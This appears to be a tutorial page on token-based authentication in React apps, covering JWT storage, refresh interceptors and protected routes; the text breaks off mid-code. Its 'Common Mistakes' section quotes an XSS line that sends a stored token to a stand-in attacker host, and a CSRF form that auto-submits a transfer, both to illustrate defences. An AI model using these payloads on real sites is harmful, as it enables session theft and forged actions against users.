---
title: Authentication
layout: doc
slug: authentication
---

# Authentication

## Key Insight

**Authentication in SPAs uses token-based systems (JWT) stored in memory or httpOnly cookies**, where login returns an access token (short-lived, 15min) and refresh token (long-lived, 7days). The access token includes in Authorization header (`Bearer eyJ...`) proves identity for API requests, refresh token exchanges for new access token when expired, and logout clears all tokens preventing further API access. **The critical security trade-off**: localStorage is vulnerable to XSS attacks (JavaScript can steal tokens), httpOnly cookies prevent XSS but require CSRF protection, and memory storage (React state) is most secure but lost on page refresh unless combined with refresh token flow.

## Detailed Description

Authentication is the process of **verifying user identity** before granting access to protected resources. In modern Single Page Applications, this involves maintaining user session state across multiple API calls without requiring re-login on every request.

**Traditional Session-based Auth (Server-side Sessions):**
- Server creates session after login, stores in database/Redis with session ID
- Session ID sent to client as cookie
- Every request includes cookie, server looks up session to verify user
- **Problems for SPAs**: Doesn't scale horizontally (session stored on one server), CORS complications, not ideal for microservices

**Token-based Authentication (Modern SPAs):**
- Server creates JWT (JSON Web Token) after login containing user info + expiration
- JWT sent to client, client stores token (memory, localStorage, cookie)
- Every API request includes JWT in Authorization header: `Authorization: Bearer <token>`
- Server verifies JWT signature without database lookup (stateless)
- **Benefits**: Stateless (no server-side session storage), works with CORS, scales horizontally, microservice-friendly

**JWT Structure (3 parts separated by dots):**

1. **Header**: Algorithm + token type → `{"alg": "HS256", "typ": "JWT"}`
2. **Payload**: User data + expiration → `{"userId": 123, "role": "admin", "exp": 1672531200}`
3. **Signature**: Prevents tampering → `HMACSHA256(header + payload, secret)`

**Core Auth Concepts:**

1. **Login Flow**: Submit credentials → Server validates → Return access token + refresh token → Store tokens → Redirect to dashboard
2. **Protected Routes**: Check if user is authenticated before rendering route, redirect to /login if not
3. **Token Refresh**: Access token expires (15min) → Use refresh token to get new access token → Continue without re-login
4. **Logout**: Clear tokens from storage → Optionally blacklist refresh token server-side → Redirect to /login
5. **Role-Based Access Control (RBAC)**: JWT payload includes user roles → Check roles before showing UI/making API calls

**Token Storage Options (Security Trade-offs):**

| Storage | XSS Vulnerable? | CSRF Vulnerable? | Persists Refresh? | Best For |
|---------|-----------------|------------------|-------------------|----------|
| **localStorage** | ✅ Yes (JS can read) | ❌ No | ✅ Yes | Prototypes (not production) |
| **sessionStorage** | ✅ Yes (JS can read) | ❌ No | ❌ No (clears on tab close) | Testing |
| **Memory (React state)** | ❌ No | ❌ No | ❌ No (lost on refresh) | Most secure + refresh token |
| **httpOnly cookie** | ❌ No (JS can't read) | ✅ Yes (needs CSRF token) | ✅ Yes | Production (with CSRF protection) |

**Refresh Token Pattern:**
- Access token: Short-lived (15 minutes), included in every API request, stored in memory
- Refresh token: Long-lived (7 days), httpOnly cookie, used only to get new access token
- When access token expires: Call `/auth/refresh` with refresh token → Get new access token → Continue
- Why? Limits damage if access token stolen (expires quickly), refresh token in httpOnly cookie can't be stolen by JavaScript

**Common Auth Patterns:**

1. **Protected Route Component**: Wrapper that checks authentication before rendering child routes
2. **useAuth Hook**: Provides login, logout, user info, isAuthenticated state
3. **Axios Interceptors**: Automatically add Authorization header to requests, handle 401 errors, refresh tokens
4. **Auth Context**: React Context providing authentication state and actions globally

**Why Authentication Matters:**
- **Security**: Prevent unauthorized access to user data and admin features
- **Personalization**: Show user-specific content, settings, saved preferences
- **Authorization**: Different permissions for users vs admins vs guests
- **Compliance**: GDPR, HIPAA require user identity verification for data access
- **Business Logic**: Subscriptions, payments, user history all require authentication

## Code Examples

### Basic Example: Login Flow with JWT

```javascript
// ===== AUTH CONTEXT + LOGIN =====
// AuthContext.js - Global authentication state

import React, { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [token, setToken] = useState(null);
  const [loading, setLoading] = useState(true);
  
  // Check if user is already logged in on mount
  useEffect(() => {
    const storedToken = localStorage.getItem('token');
    if (storedToken) {
      // Validate token and get user info
      validateToken(storedToken);
    } else {
      setLoading(false);
    }
  }, []);
  
  const validateToken = async (token) => {
    try {
      const response = await fetch('/api/auth/me', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
        setToken(token);
      } else {
        // Token invalid, clear it
        localStorage.removeItem('token');
      }
    } catch (error) {
      console.error('Token validation failed:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const login = async (email, password) => {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      
      if (!response.ok) {
        throw new Error('Login failed');
      }
      
      const data = await response.json();
      const { access_token, user: userData } = data;
      
      // Store token
      localStorage.setItem('token', access_token);
      setToken(access_token);
      setUser(userData);
      
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  };
  
  const logout = () => {
    localStorage.removeItem('token');
    setToken(null);
    setUser(null);
  };
  
  const value = {
    user,
    token,
    login,
    logout,
    isAuthenticated: !!user,
    loading
  };
  
  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}


// ===== LOGIN FORM COMPONENT =====
// LoginPage.js - Login form using useAuth hook

import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const { login } = useAuth();
  const navigate = useNavigate();
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);
    
    const result = await login(email, password);
    
    if (result.success) {
      navigate('/dashboard');
    } else {
      setError(result.error || 'Invalid email or password');
    }
    
    setIsSubmitting(false);
  };
  
  return (
    <div className="login-page">
      <h1>Login</h1>
      
      {error && (
        <div className="error-message" role="alert">
          {error}
        </div>
      )}
      
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="email">Email</label>
          <input
            id="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </div>
        
        <div className="form-group">
          <label htmlFor="password">Password</label>
          <input
            id="password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        
        <button type="submit" disabled={isSubmitting}>
          {isSubmitting ? 'Logging in...' : 'Login'}
        </button>
      </form>
    </div>
  );
}

export default LoginPage;


// ===== PROTECTED ROUTE =====
// ProtectedRoute.js - Redirect to login if not authenticated

import { Navigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

{% raw %}
function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!isAuthenticated) {
    // Redirect to login, save attempted URL
    return <Navigate to="/login" state={{ from: location.pathname }} replace />;
  }
  
  return children;
}
{% endraw %}

export default ProtectedRoute;


// ===== APP ROUTING =====
// App.js - Setup routes with protection

import { BrowserRouter, Routes, Route } from 'react-router-dom';
import { AuthProvider } from './AuthContext';
import LoginPage from './LoginPage';
import Dashboard from './Dashboard';
import ProtectedRoute from './ProtectedRoute';

function App() {
  return (
    <AuthProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/login" element={<LoginPage />} />
          
          <Route
            path="/dashboard"
            element={
              <ProtectedRoute>
                <Dashboard />
              </ProtectedRoute>
            }
          />
          
          <Route path="/" element={<Navigate to="/dashboard" />} />
        </Routes>
      </BrowserRouter>
    </AuthProvider>
  );
}

export default App;
```

### Practical Example: Axios Interceptors with Token Refresh

```javascript
// ===== AXIOS INSTANCE WITH INTERCEPTORS =====
// api.js - Automatic token handling

import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  headers: {
    'Content-Type': 'application/json'
  }
});

// Request interceptor - Add token to every request
api.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem('token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor - Handle 401 errors and refresh token
let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });
  
  failedQueue = [];
};

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    // If 401 and we haven't tried to refresh yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Already refreshing, queue this request
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(token => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            return api(originalRequest);
          })
          .catch(err => Promise.reject(err));
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        // Call refresh endpoint
        const response = await axios.post('/api/auth/refresh', {
          refresh_token: localStorage.getItem('refresh_token')
        });
        
        const { access_token } = response.data;
        localStorage.setItem('token', access_token);
        
        // Update default header
        api.defaults.headers.Authorization = `Bearer ${access_token}`;
        originalRequest.headers.Authorization = `Bearer ${access_token}`;
        
        processQueue(null, access_token);
        
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        
        // Refresh failed, logout user
        localStorage.removeItem('token');
        localStorage.removeItem('refresh_token');
        window.location.href = '/login';
        
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);

export default api;


// ===== USING THE API INSTANCE =====
// UserProfile.js - Fetch protected data

import React, { useEffect, useState } from 'react';
import api from './api';

function UserProfile() {
  const [profile, setProfile] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    fetchProfile();
  }, []);
  
  const fetchProfile = async () => {
    try {
      // Token automatically added by interceptor
      const response = await api.get('/users/me');
      setProfile(response.data);
    } catch (error) {
      console.error('Failed to fetch profile:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const updateProfile = async (updates) => {
    try {
      const response = await api.patch('/users/me', updates);
      setProfile(response.data);
    } catch (error) {
      console.error('Failed to update profile:', error);
    }
  };
  
  if (loading) return <div>Loading profile...</div>;
  if (!profile) return <div>No profile found</div>;
  
  return (
    <div>
      <h1>{profile.name}</h1>
      <p>Email: {profile.email}</p>
      <p>Role: {profile.role}</p>
    </div>
  );
}

export default UserProfile;
```

### Advanced Example: Secure Token Storage with Refresh Flow

```javascript
// ===== SECURE AUTH SERVICE =====
// authService.js - Memory storage + httpOnly cookies for refresh token

class AuthService {
  constructor() {
    this.accessToken = null;  // Stored in memory only
    this.tokenExpirationTime = null;
    this.refreshTokenTimer = null;
  }
  
  async login(email, password) {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
        credentials: 'include'  // Include cookies (refresh token)
      });
      
      if (!response.ok) {
        throw new Error('Login failed');
      }
      
      const data = await response.json();
      
      // Access token in memory
      this.accessToken = data.access_token;
      this.tokenExpirationTime = Date.now() + (data.expires_in * 1000);
      
      // Refresh token sent as httpOnly cookie by server
      // JavaScript cannot access it (XSS protection)
      
      // Schedule automatic refresh before expiration
      this.scheduleTokenRefresh();
      
      return { success: true, user: data.user };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }
  
  scheduleTokenRefresh() {
    // Clear existing timer
    if (this.refreshTokenTimer) {
      clearTimeout(this.refreshTokenTimer);
    }
    
    // Refresh 1 minute before expiration
    const refreshTime = this.tokenExpirationTime - Date.now() - 60000;
    
    if (refreshTime > 0) {
      this.refreshTokenTimer = setTimeout(() => {
        this.refreshToken();
      }, refreshTime);
    }
  }
  
  async refreshToken() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include'  // Send httpOnly cookie with refresh token
      });
      
      if (!response.ok) {
        throw new Error('Token refresh failed');
      }
      
      const data = await response.json();
      
      // Update access token
      this.accessToken = data.access_token;
      this.tokenExpirationTime = Date.now() + (data.expires_in * 1000);
      
      // Schedule next refresh
      this.scheduleTokenRefresh();
      
      return true;
    } catch (error) {
      // Refresh failed, logout user
      this.logout();
      window.location.href = '/login';
      return false;
    }
  }
  
  async logout() {
    try {
      // Call logout endpoint to invalidate refresh token
      await fetch('/api/auth/logout', {
        method: 'POST',
        credentials: 'include'
      });
    } catch (error) {
      console.error('Logout error:', error);
    } finally {
      // Clear access token from memory
      this.accessToken = null;
      this.tokenExpirationTime = null;
      
      if (this.refreshTokenTimer) {
        clearTimeout(this.refreshTokenTimer);
        this.refreshTokenTimer = null;
      }
    }
  }
  
  getAccessToken() {
    // Check if token is still valid
    if (this.accessToken && Date.now() < this.tokenExpirationTime) {
      return this.accessToken;
    }
    return null;
  }
  
  isAuthenticated() {
    return this.getAccessToken() !== null;
  }
}

export default new AuthService();


// ===== ROLE-BASED ACCESS CONTROL =====
// RoleGuard.js - Check user roles for access

import { useAuth } from './AuthContext';
import { Navigate } from 'react-router-dom';

function RoleGuard({ children, requiredRole }) {
  const { user, isAuthenticated, loading } = useAuth();
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }
  
  // Check if user has required role
  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }
  
  return children;
}

export default RoleGuard;


// ===== USAGE IN ROUTES =====
// AdminPanel.js - Only accessible to admins

import RoleGuard from './RoleGuard';

function App() {
  return (
    <Routes>
      <Route path="/login" element={<LoginPage />} />
      
      <Route
        path="/admin"
        element={
          <RoleGuard requiredRole="admin">
            <AdminPanel />
          </RoleGuard>
        }
      />
      
      <Route
        path="/dashboard"
        element={
          <ProtectedRoute>
            <Dashboard />
          </ProtectedRoute>
        }
      />
    </Routes>
  );
}


// ===== DECODE JWT TO GET USER INFO =====
// jwtUtils.js - Parse JWT payload

export function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) {
      throw new Error('Invalid JWT');
    }
    
    // Decode base64 payload
    const payload = JSON.parse(atob(parts[1]));
    return payload;
  } catch (error) {
    console.error('Failed to decode JWT:', error);
    return null;
  }
}

export function isTokenExpired(token) {
  const payload = decodeJWT(token);
  if (!payload || !payload.exp) {
    return true;
  }
  
  // exp is in seconds, Date.now() is in milliseconds
  return Date.now() >= payload.exp * 1000;
}

// Usage
const token = localStorage.getItem('token');
if (token && !isTokenExpired(token)) {
  const payload = decodeJWT(token);
  console.log('User ID:', payload.userId);
  console.log('Roles:', payload.roles);
}
```

## Common Mistakes

### 1. Storing JWT in localStorage (XSS Vulnerability)
**Mistake:** Storing authentication tokens in localStorage where malicious JavaScript can steal them.

```javascript
// ❌ BAD: localStorage vulnerable to XSS attacks
function login(email, password) {
  fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ email, password })
  })
    .then(r => r.json())
    .then(data => {
      localStorage.setItem('token', data.access_token);
      // If attacker injects <script> tag via XSS:
      // <script>
      //   fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
      // </script>
      // Now attacker has your token!
    });
}


// ✅ GOOD: Store in memory + httpOnly cookie for refresh token
class AuthService {
  constructor() {
    this.accessToken = null;  // Memory only, XSS can't access
  }
  
  async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
      credentials: 'include'  // Server sets httpOnly cookie
    });
    
    const data = await response.json();
    
    // Access token in memory (lost on refresh, but short-lived)
    this.accessToken = data.access_token;
    
    // Refresh token sent as httpOnly cookie
    // JavaScript CANNOT access it: document.cookie won't show it
    // XSS attacks can't steal it
  }
  
  getToken() {
    return this.accessToken;
  }
}

// Server-side (Node.js/Express):
app.post('/api/login', (req, res) => {
  // ... validate credentials ...
  
  const accessToken = generateAccessToken(user);  // 15 min expiry
  const refreshToken = generateRefreshToken(user);  // 7 days expiry
  
  // Send refresh token as httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JavaScript can't access
    secure: true,    // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  res.json({
    access_token: accessToken,
    expires_in: 900  // 15 minutes
  });
});
```

**Why it matters:** XSS attacks can steal localStorage tokens, gaining full account access. httpOnly cookies can't be accessed by JavaScript.

### 2. Not Handling Token Expiration
**Mistake:** Continuing to use expired tokens, causing 401 errors on every request.

```javascript
// ❌ BAD: No expiration handling
function fetchUserData() {
  const token = localStorage.getItem('token');
  
  fetch('/api/users/me', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  })
    .then(r => {
      if (r.status === 401) {
        // Token expired! But user just sees "Unauthorized"
        // No automatic refresh, user must login again
        alert('Please login again');
      }
      return r.json();
    });
}


// ✅ GOOD: Automatic token refresh on 401
let isRefreshing = false;
let refreshSubscribers = [];

api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Already refreshing, wait for it
        return new Promise(resolve => {
          refreshSubscribers.push((token) => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            resolve(api(originalRequest));
          });
        });
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        const { data } = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true  // Send httpOnly cookie
        });
        
        const newToken = data.access_token;
        authService.accessToken = newToken;
        
        // Retry all queued requests
        refreshSubscribers.forEach(callback => callback(newToken));
        refreshSubscribers = [];
        
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed, logout
        authService.logout();
        window.location.href = '/login';
        throw refreshError;
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);
```

**Why it matters:** Users shouldn't have to re-login every 15 minutes. Refresh tokens enable seamless token renewal.

### 3. Missing CSRF Protection with Cookies
**Mistake:** Using cookies for auth without CSRF tokens, allowing cross-site request forgery.

```javascript
// ❌ BAD: Cookie-based auth without CSRF protection
// Server sets auth cookie
app.post('/api/login', (req, res) => {
  res.cookie('auth', token, { httpOnly: true });
  res.json({ success: true });
});

// Browser automatically sends cookie with EVERY request
// Attacker creates malicious site:
// <form action="https://yoursite.com/api/transfer-money" method="POST">
//   <input name="to" value="attacker" />
//   <input name="amount" value="1000" />
// </form>
// <script>document.forms[0].submit()</script>
//
// When victim visits attacker site, form submits with victim's cookie!


// ✅ GOOD: CSRF token verification
// Server generates CSRF token and sends in cookie + header
app.post('/api/login', (req, res) => {
  const csrfToken = generateCSRFToken();
  
  res.cookie('auth', authToken, { httpOnly: true, sameSite: 'strict' });
  res.cookie('csrf', csrfToken, { sameSite: 'strict' });  // Readable by JS
  
  res.json({ success: true, csrfToken });
});

// Client includes CSRF token in header
axios.interceptors.request.use(config => {
  const csrfToken = getCookie('csrf');
  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});

// Server verifies token matches
app.post('/api/transfer-money', (req, res) => {
  const csrfFromHeader = req.headers['x-csrf-token'];
  const csrfFromCookie = req.cookies.csrf;
  
  if (csrfFromHeader !== csrfFromCookie) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  
  // Process transfer...
});

// Attacker can't get CSRF token (different origin)
// sameSite='strict' prevents cookie from being sent cross-origin
```

**Why it matters:** CSRF attacks trick browsers into making authenticated requests to your site from malicious sites.

## Quick Quiz

<details>
<summary><strong>Question 1:</strong> Where should you store JWT tokens and why?</summary>

**Answer:** **Store access tokens in memory (React state) and refresh tokens in httpOnly cookies. This combination prevents XSS attacks while maintaining user sessions across page refreshes.**

**Storage comparison:**

```javascript
// ===== OPTION 1: localStorage (DON'T USE IN PRODUCTION) =====
localStorage.setItem('token', accessToken);

// Problems:
// - XSS: Any injected script can steal: localStorage.getItem('token')
// - Persists across tabs/windows (privacy issue)
// - Can't be cleared server-side

// When to use: Prototypes, development only


// ===== OPTION 2: sessionStorage (SLIGHTLY BETTER) =====
sessionStorage.setItem('token', accessToken);

// Problems:
// - Still vulnerable to XSS
// - Lost when tab closes (UX issue)

// When to use: Testing, temporary sessions


// ===== OPTION 3: httpOnly Cookie (PRODUCTION CHOICE) =====
// Server-side (Node.js):
res.cookie('refreshToken', token, {
  httpOnly: true,   // JavaScript can't access via document.cookie
  secure: true,     // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});

// Client-side:
console.log(document.cookie);  // Won't show httpOnly cookies!

// Benefits:
// - XSS can't steal (JavaScript can't read)
// - Automatically sent with requests
// - Server can invalidate

// Problems:
// - Requires CSRF protection
// - More complex setup


// ===== OPTION 4: MEMORY + httpOnly Cookie (BEST PRACTICE) =====
class AuthService {
  constructor() {
    this.accessToken = null;  // Short-lived (15min), in memory
  }
  
  async login(email, password) {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password }),
      credentials: 'include'  // Send/receive cookies
    });
    
    const data = await res.json();
    
    // Access token in memory only
    this.accessToken = data.access_token;  // Expires in 15 min
    
    // Refresh token in httpOnly cookie (7 days)
    // Set by server, can't be accessed by JS
  }
  
  async refreshToken() {
    // Call with httpOnly cookie containing refresh token
    const res = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    const data = await res.json();
    this.accessToken = data.access_token;
  }
  
  getToken() {
    return this.accessToken;
  }
}

// How it works:
// 1. Login → Get access token (memory) + refresh token (httpOnly cookie)
// 2. API requests → Send access token in Authorization header
// 3. Access token expires (15 min) → Use refresh token to get new access token
// 4. Page refresh → Access token lost, but refresh token cookie still there
//    → Automatically refresh to get new access token
// 5. XSS attack → Can't steal httpOnly cookie, access token lost on refresh

// Benefits:
// - XSS protection (httpOnly cookie)
// - Short-lived access tokens limit damage
// - Seamless UX (automatic refresh)
// - CSRF protection via sameSite=strict
```

**Decision matrix:**

| Scenario | Recommended Storage |
|----------|-------------------|
| Production app | Memory (access) + httpOnly cookie (refresh) |
| High-security app | httpOnly cookie for both + CSRF tokens |
| Quick prototype | localStorage (acknowledge risk) |
| Mobile app | Secure storage (Keychain/Keystore) |

**Why it matters:** Token storage is the #1 authentication security decision. localStorage vulnerabilities have led to massive data breaches.
</details>

<details>
<summary><strong>Question 2:</strong> How do you implement token refresh without logging users out?</summary>

**Answer:** **Use axios interceptors to detect 401 errors, call refresh endpoint with refresh token, get new access token, retry original request. Queue simultaneous requests to avoid multiple refresh calls.**

```javascript
// ===== TOKEN REFRESH INTERCEPTOR =====
import axios from 'axios';

const api = axios.create({ baseURL: '/api' });

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(promise => {
    if (error) {
      promise.reject(error);
    } else {
      promise.resolve(token);
    }
  });
  failedQueue = [];
};

// Add token to every request
api.interceptors.request.use(config => {
  const token = authService.getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Handle 401 errors and refresh
api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // If error is 401 and we haven't retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      
      // If already refreshing, queue this request
      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(token => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            return api(originalRequest);
          })
          .catch(err => Promise.reject(err));
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        // Call refresh endpoint
        const response = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true  // Send httpOnly cookie
        });
        
        const { access_token } = response.data;
        
        // Update stored token
        authService.setAccessToken(access_token);
        
        // Process all queued requests with new token
        processQueue(null, access_token);
        
        // Retry original request with new token
        originalRequest.headers.Authorization = `Bearer ${access_token}`;
        return api(originalRequest);
        
      } catch (refreshError) {
        // Refresh failed - logout user
        processQueue(refreshError, null);
        authService.logout();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);

export default api;


// ===== USAGE EXAMPLE =====
// Components don't need to worry about token refresh

function UserDashboard() {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    // If token expired, interceptor automatically refreshes
    api.get('/users/me')
      .then(res => setData(res.data))
      .catch(err => console.error(err));
  }, []);
  
  const updateProfile = async (updates) => {
    try {
      const res = await api.patch('/users/me', updates);
      setData(res.data);
    } catch (err) {
      console.error('Update failed:', err);
    }
  };
  
  return <div>{/* UI */}</div>;
}


// ===== PROACTIVE REFRESH (BEFORE EXPIRATION) =====
// Better UX: refresh before token expires

class AuthService {
  constructor() {
    this.accessToken = null;
    this.tokenExpiry = null;
    this.refreshTimer = null;
  }
  
  setAccessToken(token) {
    this.accessToken = token;
    
    // Decode JWT to get expiration
    const payload = JSON.parse(atob(token.split('.')[1]));
    this.tokenExpiry = payload.exp * 1000;  // Convert to milliseconds
    
    // Schedule refresh 1 minute before expiration
    this.scheduleRefresh();
  }
  
  scheduleRefresh() {
    if (this.refreshTimer) {
      clearTimeout(this.refreshTimer);
    }
    
    const now = Date.now();
    const timeUntilRefresh = this.tokenExpiry - now - 60000;  // 1 min early
    
    if (timeUntilRefresh > 0) {
      this.refreshTimer = setTimeout(() => {
        this.refreshToken();
      }, timeUntilRefresh);
    }
  }
  
  async refreshToken() {
    try {
      const res = await axios.post('/api/auth/refresh', {}, {
        withCredentials: true
      });
      
      this.setAccessToken(res.data.access_token);
    } catch (error) {
      console.error('Proactive refresh failed:', error);
      this.logout();
    }
  }
}
```

**Flow diagram:**

```
User makes API request
        ↓
Axios adds Authorization header
        ↓
Server responds 401 (token expired)
        ↓
Interceptor catches 401
        ↓
Is refresh already in progress?
  Yes → Queue this request
  No  → Start refresh process
        ↓
Call /api/auth/refresh with httpOnly cookie
        ↓
Server validates refresh token
        ↓
Server returns new access token
        ↓
Update stored access token
        ↓
Retry original request with new token
        ↓
Process all queued requests
        ↓
Return response to user
```

**Why it matters:** Users shouldn't experience interruptions every 15 minutes. Automatic refresh makes auth invisible.
</details>

<details>
<summary><strong>Question 3:</strong> How do protected routes work in React Router?</summary>

**Answer:** **Protected routes check authentication status before rendering. If authenticated, render children; if not, redirect to login with saved intended destination.**

{% raw %}
```javascript
// ===== BASIC PROTECTED ROUTE =====
import { Navigate, useLocation } from 'react-router-dom';
import { useAuth } from './AuthContext';

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  const location = useLocation();
  
  // Show loading while checking auth status
  if (loading) {
    return <div className="loading-spinner">Loading...</div>;
  }
  
  // Not authenticated - redirect to login
  if (!isAuthenticated) {
    // Save current location to redirect back after login
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  // Authenticated - render protected content
  return children;
}

// Usage in routes
<Route
  path="/dashboard"
  element={
    <ProtectedRoute>
      <Dashboard />
    </ProtectedRoute>
  }
/>


// ===== LOGIN REDIRECT BACK TO INTENDED PAGE =====
function LoginPage() {
  const { login } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  
  const from = location.state?.from?.pathname || '/dashboard';
  
  const handleLogin = async (email, password) => {
    const result = await login(email, password);
    
    if (result.success) {
      // Redirect to originally requested page
      navigate(from, { replace: true });
    }
  };
  
  return <form onSubmit={handleLogin}>{/* ... */}</form>;
}


// ===== ROLE-BASED PROTECTED ROUTE =====
{% raw %}
function RoleProtectedRoute({ children, requiredRole }) {
  const { user, isAuthenticated, loading } = useAuth();
  const location = useLocation();
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }
  
  // Check if user has required role
  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/forbidden" replace />;
  }
  
  return children;
}
{% endraw %}

// Usage
<Route
  path="/admin"
  element={
    <RoleProtectedRoute requiredRole="admin">
      <AdminPanel />
    </RoleProtectedRoute>
  }
/>


// ===== MULTIPLE ROLES SUPPORT =====
function RoleProtectedRoute({ children, allowedRoles = [] }) {
  const { user, isAuthenticated } = useAuth();
  
  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }
  
  // Check if user has any of the allowed roles
  if (allowedRoles.length > 0 && !allowedRoles.includes(user.role)) {
    return <Navigate to="/forbidden" replace />;
  }
  
  return children;
}

// Usage
<Route
  path="/reports"
  element={
    <RoleProtectedRoute allowedRoles={['admin', 'manager']}>
      <ReportsPage />
    </RoleProtectedRoute>
  }
/>


// ===== PERMISSION-BASED ROUTE =====
function PermissionGuard({ children, requiredPermission }) {
  const { user, isAuthenticated } = useAuth();
  
  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }
  
  // Check if user has specific permission
  const hasPermission = user.permissions?.includes(requiredPermission);
  
  if (!hasPermission) {
    return (
      <div className="forbidden">
        <h1>Access Denied</h1>
        <p>You don't have permission to view this page.</p>
        <p>Required permission: {requiredPermission}</p>
      </div>
    );
  }
  
  return children;
}

// Usage
<Route
  path="/users/delete"
  element={
    <PermissionGuard requiredPermission="users:delete">
      <DeleteUsersPage />
    </PermissionGuard>
  }
/>


// ===== LAZY-LOADED PROTECTED ROUTES =====
import { lazy, Suspense } from 'react';

const AdminPanel = lazy(() => import('./AdminPanel'));

<Route
  path="/admin"
  element={
    <ProtectedRoute>
      <Suspense fallback={<div>Loading admin panel...</div>}>
        <AdminPanel />
      </Suspense>
    </ProtectedRoute>
  }
/>


// ===== NESTED PROTECTED ROUTES =====
function App() {
  return (
    <Routes>
      <Route path="/login" element={<LoginPage />} />
      
      {/* All routes under /app are protected */}
      <Route
